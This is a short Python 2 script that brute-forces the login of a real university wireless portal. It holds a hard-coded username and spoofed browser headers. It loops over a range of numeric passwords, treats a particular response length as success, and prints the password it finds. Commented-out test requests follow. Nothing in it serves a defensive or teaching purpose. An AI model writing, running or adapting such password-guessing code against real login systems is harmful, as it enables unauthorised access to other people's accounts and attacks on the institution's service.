__author__ = 'lms'

import requests

request_url = "http://w.nuaa.edu.cn/iPortal/action/doLogin.do"
login_info = {
                'username':'70206168',
                'password': '182013',
                'saved': '1',
                "from": '003cc944be32e25365428f2dd2adbbe2',
                'domain': 'nuaa'
                }

headers = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language':'zh-CN,zh;q=0.8,en;q=0.6',
            'Connection':'keep-alive',
            'Content-Type':'application/x-www-form-urlencoded',
            'Host':'w.nuaa.edu.cn',
            'Origin':'http://w.nuaa.edu.cn',
            'Referer':'http://w.nuaa.edu.cn/iPortal/index.htm?'
                      'from=003cc944be32e25365428f2dd2adbbe2&wlanuserfirsturl=http://www.baidu.com/',
            'User-Agen':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) '
                        'Chrome/38.0.2125.104 Safari/537.36',
            'X-Requested-With':'XMLHttpRequest'
            }

#print login_info['password']
for i in range(182010,182017):
    login_info['password']=i
    #print login_info['password']
    loginRequest = requests.post(request_url,data=login_info,headers=headers)
    #print login_info.header[content-length]
    if(loginRequest.headers['content-length']=='258'):
        print login_info['password']
        break




'''r = requests.post(request_url,data=login_info,headers=headers)
r1 = requests.get("http://www.cnblogs.com/Ninputer/default.html?page=2")
print r.headers
print r1.content
#print r1.content
'''
'''loginRequest = requests.post(request_url,data=login_info,headers=headers)
if(loginRequest.headers['content-length']=='1289'):
    print loginRequest.headers['content-length']
'''







